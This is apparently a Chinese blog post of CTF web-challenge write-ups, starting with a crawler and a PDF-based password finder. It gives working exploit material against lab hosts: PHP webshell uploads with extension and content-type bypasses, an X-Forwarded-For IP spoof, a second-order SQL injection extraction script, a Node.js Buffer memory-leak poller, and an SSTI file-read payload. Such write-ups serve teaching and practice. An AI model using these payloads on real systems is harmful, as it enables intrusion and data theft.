<h2 id="python爬虫模板"><a href="#python爬虫模板" class="headerlink" title="python爬虫模板"></a>python爬虫模板</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_file</span>(<span class="params">url, index</span>):</span></span><br><span class="line">    local_filename = index+<span class="string">&#x27;-&#x27;</span>+url.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">    r = requests.get(url, stream=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(local_filename, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> chunk <span class="keyword">in</span> r.iter_content(chunk_size=<span class="number">1024</span>):</span><br><span class="line">            <span class="keyword">if</span> chunk:</span><br><span class="line">                f.write(chunk)</span><br><span class="line">                f.flush</span><br><span class="line">    <span class="keyword">return</span> local_filename</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_url</span>(<span class="params">root_link</span>):</span></span><br><span class="line">    print(root_link)</span><br><span class="line">    r = requests.get(root_link)</span><br><span class="line">    <span class="keyword">if</span> r.status_code==<span class="number">200</span>:</span><br><span class="line">        soup = BeautifulSoup(r.text)</span><br><span class="line">        index = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> link <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">            new_link = root_link + link.get(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line">            print(<span class="string">&quot;root_link = &quot;</span> + root_link)</span><br><span class="line">            print(<span class="string">&quot;new_link = &quot;</span> + new_link)</span><br><span class="line">            <span class="keyword">if</span> new_link.endswith(<span class="string">&quot;.pdf&quot;</span>):</span><br><span class="line">                print(<span class="string">&quot;debug 1&quot;</span>)</span><br><span class="line">                file_path = download_file(new_link,<span class="built_in">str</span>(index))</span><br><span class="line">                print(<span class="string">&quot;downloading:&quot;</span>+new_link+<span class="string">&quot; -&gt; &quot;</span>+file_path)</span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> new_link.endswith(<span class="string">&quot;.html&quot;</span>) <span class="keyword">and</span> new_link != url:</span><br><span class="line">                print(<span class="string">&quot;debug 2&quot;</span>)</span><br><span class="line">                get_url(new_link);</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;error occur&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://220.249.52.134:40279/&quot;</span></span><br><span class="line">    get_url(url)</span><br></pre></td></tr></table></figure>
<h2 id="python-pdfminer的用法"><a href="#python-pdfminer的用法" class="headerlink" title="python pdfminer的用法"></a>python pdfminer的用法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cStringIO <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager, PDFPageInterpreter</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> TextConverter</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LAParams</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFPage</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pdf</span>():</span><span class="comment">#打开pdf文件</span></span><br><span class="line">    <span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">&quot;./&quot;</span>) <span class="keyword">if</span> i.endswith(<span class="string">&quot;pdf&quot;</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_pdf_2_text</span>(<span class="params">path</span>):</span><span class="comment">#获取pdf文本</span></span><br><span class="line">    rsrcmgr = PDFResourceManager()</span><br><span class="line">    retstr = StringIO()</span><br><span class="line">    device = TextConverter(rsrcmgr, retstr, codec=<span class="string">&#x27;utf-8&#x27;</span>, laparams=LAParams())</span><br><span class="line">    interpreter = PDFPageInterpreter(rsrcmgr, device)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> PDFPage.get_pages(fp, <span class="built_in">set</span>()):</span><br><span class="line">            interpreter.process_page(page)</span><br><span class="line">        text = retstr.getvalue()</span><br><span class="line">    device.close()</span><br><span class="line">    retstr.close()</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_password</span>():</span><span class="comment">#读取密码</span></span><br><span class="line">    pdf_path = get_pdf()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pdf_path:</span><br><span class="line">        <span class="built_in">print</span></span><br><span class="line">        <span class="string">&quot;Searching word in &quot;</span> + i</span><br><span class="line">        pdf_text = convert_pdf_2_text(i).split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> pdf_text:</span><br><span class="line">            sha1_password = hashlib.sha1(word + <span class="string">&quot;Salz!&quot;</span>).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> sha1_password == <span class="string">&#x27;3fab54a50e770d830c0416df817567662a9dc85c&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span></span><br><span class="line">                <span class="string">&quot;Find the password :&quot;</span> + word</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    find_password()</span><br></pre></td></tr></table></figure>
<h1 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h1><p>考察：网页提权，文件上传绕过，一句话木马</p>
<p><strong>第一步</strong></p>
<p>登录页面后，有登录、注册、找回密码三个页面。注册一个账号，登录后有主页、管理、个人信息、更改密码、登出五个页面。</p>
<p>点击管理页面，提示只有admin才能登录，因此确定需要通过某种方式登录admin。</p>
<p>尝试每个页面sqlmap跑注入，失败。</p>
<p>修改密码时，用户会短暂提权为root权限。而靶机的修改密码操作为先确认用户信息，再输入新密码。在输入新密码时使用burp抓包，修改用户名为admin，即可修改admin密码。</p>
<p><strong>第二步</strong></p>
<p>以admin用户登录后，点击Manage，提示IP not allowed</p>
<p>添加X-Forwarded-For字段，并设置值为127.0.0.1，提交后能成功登录</p>
<p><strong>第三步</strong></p>
<p>页面显示”where is the flag”</p>
<p>显示页面源码，源码中有注释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- index.php?module&#x3D;filemanage&amp;do&#x3D;???--&gt;</span><br></pre></td></tr></table></figure>
<p>多次尝试后，do值为upload时有了新的页面</p>
<p><strong>第四步</strong></p>
<p>页面显示为上传一个图片，很明显是一个文件上传绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upfile&quot;; filename&#x3D;&quot;sqzr.php5&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt; highlight_file(__FILE__);system($_GET[&#39;cmd&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>注意此处进行了三个过滤</p>
<ul>
<li><?php>标签的过滤：php代码也可以用<script langua="php">的方法绕过</li>
<li>php后缀的过滤：可以设置后缀从php2一直到php5</li>
<li>content-type的过滤：设置content-type为image/jpeg</li>
</ul>
<p><strong>最后一步</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;4257116016b10a693f5ed7b0a5effd5e&#125;</span><br></pre></td></tr></table></figure>
<h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>用户在修改密码时，能短暂的拥有root权限。</p>
<h2 id="X-Forwarded-For"><a href="#X-Forwarded-For" class="headerlink" title="X-Forwarded-For"></a>X-Forwarded-For</h2><p>后端web server从X-Forward-For中获取client ip，因此可以用于绕过登录server时对主机IP的检测</p>
<h2 id="php代码的第二种表示方法"><a href="#php代码的第二种表示方法" class="headerlink" title="php代码的第二种表示方法"></a>php代码的第二种表示方法</h2><script language="php">


</script>

<h2 id="文件上传时php后缀检测的绕过"><a href="#文件上传时php后缀检测的绕过" class="headerlink" title="文件上传时php后缀检测的绕过"></a>文件上传时php后缀检测的绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phtml，php2，php3，php4，php5</span><br></pre></td></tr></table></figure>
<h1 id="ics07"><a href="#ics07" class="headerlink" title="ics07"></a>ics07</h1><p>考察：php弱等于判断绕过，一句话木马，菜刀</p>
<p><strong>第一步</strong></p>
<p>首先打开网页，只有“项目管理“可以进去</p>
<p>进入后，有一个view-source，打开，有用的部分如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]) &#123;</span><br><span class="line">       <span class="variable">$con</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;con&#x27;</span>];</span><br><span class="line">       <span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">       <span class="variable">$filename</span> = <span class="string">&quot;backup/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+\.ph(p[3457]?|t|tml)$/i&#x27;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;Bad file extension&quot;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            chdir(<span class="string">&#x27;uploaded&#x27;</span>);</span><br><span class="line">           <span class="variable">$f</span> = fopen(<span class="variable">$filename</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">           fwrite(<span class="variable">$f</span>, <span class="variable">$con</span>);</span><br><span class="line">           fclose(<span class="variable">$f</span>);</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[id]) &amp;&amp; floatval(<span class="variable">$_GET</span>[id]) !== <span class="string">&#x27;1&#x27;</span> &amp;&amp; substr(<span class="variable">$_GET</span>[id], <span class="number">-1</span>) === <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$id</span> = mysql_real_escape_string(<span class="variable">$_GET</span>[id]);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;select * from cetc007.user where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$result</span> = mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="literal">False</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="variable">$result</span>)<span class="keyword">die</span>(<span class="string">&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span>.<span class="variable">$result</span>-&gt;id.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;name:&quot;</span>.<span class="variable">$result</span>-&gt;user.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>第二步</strong></p>
<p>第一段很明显，是上传一个木马，但是需要$_SESSION[‘admin’]是true</p>
<p>第二段若$result是true，则会把$_SESSION[‘admin’]设置为true，则需要绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[id]) &amp;&amp; floatval(<span class="variable">$_GET</span>[id]) !== <span class="string">&#x27;1&#x27;</span> &amp;&amp; substr(<span class="variable">$_GET</span>[id], <span class="number">-1</span>) === <span class="string">&#x27;9&#x27;</span>) </span><br></pre></td></tr></table></figure>
<p>则url为</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.134:55693/index.php?page=1&amp;id=1a9&amp;submit=submit</span><br></pre></td></tr></table></figure>
<p>顺利绕过，页面显示结果</p>
<p>此处陷入误区，在id处尝试sql注入失败</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_45552960&#x2F;article&#x2F;details&#x2F;102777514</span><br><span class="line">代码中使用了mysql_real_escape_string()函数 , 该函数用于转义SQL语句中使用的字符串中的特殊字符 , 防御SQL注入 . 虽然可以利用宽字符注入绕过这个防御机制 , 但是要求目标站点使用GBK编码 . 这些细节信息我都不知道 , 所以想要注入是比较难的</span><br></pre></td></tr></table></figure>


<p><strong>第三步</strong></p>
<p>上传一句话木马，需要绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#39;&#x2F;.+\.ph(p[3457]?|t|tml)$&#x2F;i&#39;, $filename))</span><br></pre></td></tr></table></figure>
<p>发现这段正则只对最后.进行了检查，因此可以通过/.的方式绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;..&#x2F;test.php&#x2F;.&amp;con&#x3D;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>最后一步</strong></p>
<p>菜刀连接<a target="_blank" rel="noopener" href="http://220.249.52.134:55693/uploaded/test.php">http://220.249.52.134:55693/uploaded/test.php</a></p>
<p>找到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;c28c1bc69e1ba8ab132b3dbded9232e4&#125;</span><br></pre></td></tr></table></figure>
<h1 id="unfinish"><a href="#unfinish" class="headerlink" title="unfinish"></a>unfinish</h1><p>考察：sql二次注入，python脚本编写</p>
<p><strong>第一步</strong></p>
<p>登录页面，使用御剑扫描后台，有login.php，register.php两个有效文件</p>
<p>register.php页面注册用户，需要填入email、username、password，以post方式提交</p>
<p>login.php页面登录，需要填入email、password，以post方式提交</p>
<p>登录为index.php页面，能显示用户名username</p>
<p>根据wp：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/R3col/p/12690413.html">https://www.cnblogs.com/R3col/p/12690413.html</a></p>
<p><strong>第二步</strong></p>
<p>尝试使用sqlmap在register.php和login.php上进行注入，均失败</p>
<p><strong>第三步</strong></p>
<p>二次注入脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">register_url = <span class="string">&quot;http://220.249.52.134:54877/register.php&quot;</span></span><br><span class="line">login_url = <span class="string">&quot;http://220.249.52.134:54877/login.php&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">	register_data = &#123;</span><br><span class="line">		<span class="string">&quot;email&quot;</span>:<span class="string">&quot;111@123.com%d&quot;</span> % i,</span><br><span class="line">		<span class="string">&quot;username&quot;</span>:<span class="string">&quot;0&#x27; + ascii(substr((select * from flag) from %d for 1))+&#x27;0&quot;</span> % i,</span><br><span class="line">		<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	response_register = requests.post(url=register_url, data=register_data)</span><br><span class="line"></span><br><span class="line">	login_data = &#123;</span><br><span class="line">		<span class="string">&quot;email&quot;</span>:<span class="string">&quot;111@123.com%d&quot;</span> % i,</span><br><span class="line">		<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	response_login = requests.post(url=login_url, data=login_data)</span><br><span class="line">	<span class="comment"># print(response_login.text)</span></span><br><span class="line">	ans = re.search(<span class="string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span>, response_login.text)</span><br><span class="line">	print(<span class="built_in">chr</span>(<span class="built_in">int</span>(ans.group(<span class="number">1</span>))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>没解决的问题时email和password会影响结果，不知道为何</p>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2494e4bf06734c39be2e1626f757ba4c&#125;</span><br></pre></td></tr></table></figure>
<h2 id="sql二次注入姿势"><a href="#sql二次注入姿势" class="headerlink" title="sql二次注入姿势"></a>sql二次注入姿势</h2><p>适用于输入数据时进行了过滤，但是网页显示数据库数据未进行过滤的情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0&#39; + ascii(substr(database(),1,1)) +&#39;0</span><br><span class="line">0&#39; + ascii(substr(database() from 1 for 1)) +&#39;0</span><br></pre></td></tr></table></figure>
<h2 id="python的网页操作（re库）"><a href="#python的网页操作（re库）" class="headerlink" title="python的网页操作（re库）"></a>python的网页操作（re库）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">resp = requests.post(url=url, data=data) <span class="comment">#以post提交数据，数据返回给resp</span></span><br><span class="line">resp.text <span class="comment">#响应报文</span></span><br><span class="line">re.search(pattern, string) <span class="comment">#搜索string中出现pattern的字符串</span></span><br></pre></td></tr></table></figure>
<h1 id="leaking"><a href="#leaking" class="headerlink" title="leaking"></a>leaking</h1><p>考察：node.js逃逸</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/112387663">https://blog.csdn.net/weixin_44037296/article/details/112387663</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46676743/article/details/112669105">https://blog.csdn.net/weixin_46676743/article/details/112669105</a></p>
<p>不知道咋说，直接抄源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># encoding&#x3D;utf-8</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;220.249.52.134:41148&#x2F;?data&#x3D;Buffer(500)&#39;</span><br><span class="line">response &#x3D; &#39;&#39;</span><br><span class="line">while &#39;flag&#39; not in response:</span><br><span class="line">        req &#x3D; requests.get(url)</span><br><span class="line">        response &#x3D; req.text</span><br><span class="line">        print(req.status_code)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        if &#39;flag&#123;&#39; in response:</span><br><span class="line">            print(response)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4nother_h34rtbleed_in_n0dejs&#125;</span><br></pre></td></tr></table></figure>
<h2 id="node-js下的vm"><a href="#node-js下的vm" class="headerlink" title="node.js下的vm"></a>node.js下的vm</h2><p>一种隔离运行代码的沙箱，可以隔离当前环境上下文，但能访问当前上下文中的global变量</p>
<h2 id="node-js下的沙箱逃逸"><a href="#node-js下的沙箱逃逸" class="headerlink" title="node.js下的沙箱逃逸"></a>node.js下的沙箱逃逸</h2><p>由于js原型链的原因，可以通过contructor寻找变量prototype的方式，从而执行Function，达到沙箱逃逸的效果</p>
<h2 id="node下的Buffer"><a href="#node下的Buffer" class="headerlink" title="node下的Buffer"></a>node下的Buffer</h2><p>在较早一点的<strong>node.js</strong>版本中 (8.0 之前)，当 <code>Buffer</code> 的构造函数传入数字时, 会得到与数字长度一致的一个 <code>Buffer</code>，并且这个 <code>Buffer</code> 是未清零的。8.0 之后的版本可以通过另一个函数 <code>Buffer.allocUnsafe(size)</code> 来获得未清空的内存。</p>
<h1 id="Confusion1"><a href="#Confusion1" class="headerlink" title="Confusion1"></a>Confusion1</h1><p>考察：SSTI</p>
<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhengna/p/13964561.html">https://www.cnblogs.com/zhengna/p/13964561.html</a></p>
<p>进入网页，发现除了主页面，login和register都登不进去。</p>
<p>显示apache2.4.10，查询是否有相关可利用漏洞，失败。</p>
<p>根据wp，login.php和register.php下均有提示flag位置（！！！一定要查看源码，不能访问的页面也要查看</p>
<p>在URL上测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:45205&#x2F;index.php&#x2F;&#123;&#123; 1+1&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>返回2，说明可以SSTI注入</p>
<p>尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;opt&#x2F;flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#39;).read()</span><br></pre></td></tr></table></figure>
<p>不能得到结果，说明有绕过</p>
<p>新姿势，通过request传参进行绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:45205&#x2F;index.php&#x2F;&#123;&#123; &#39;&#39;[request.args.a][request.args.b][2][request.args.c]()[40](&#39;&#x2F;opt&#x2F;flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#39;)[request.args.d]()&#125;&#125;?a&#x3D;__class__&amp;b&#x3D;__mro__&amp;c&#x3D;__subclasses__&amp;d&#x3D;read</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;386fd2a442e4b6841a294c2f66c864a8&#125;</span><br></pre></td></tr></table></figure>
<h2 id="SSTI新姿势"><a href="#SSTI新姿势" class="headerlink" title="SSTI新姿势"></a>SSTI新姿势</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#39;&#39;[request.args.a][request.args.b][2][request.args.c]()[40](&#39;&#x2F;opt&#x2F;flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#39;)[request.args.d]()&#125;&#125;?a&#x3D;__class__&amp;b&#x3D;__mro__&amp;c&#x3D;__subclasses__&amp;d&#x3D;read</span><br><span class="line"># 注意，字符之间的连接点没了，以及括号（）和下标[]需要放在里面</span><br></pre></td></tr></table></figure>
<h1 id="easy-serialize-php"><a href="#easy-serialize-php" class="headerlink" title="easy_serialize_php"></a>easy_serialize_php</h1><p>考察：php代码审计，php序列化</p>
<p>打开页面，打开view-source，可以看到源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span 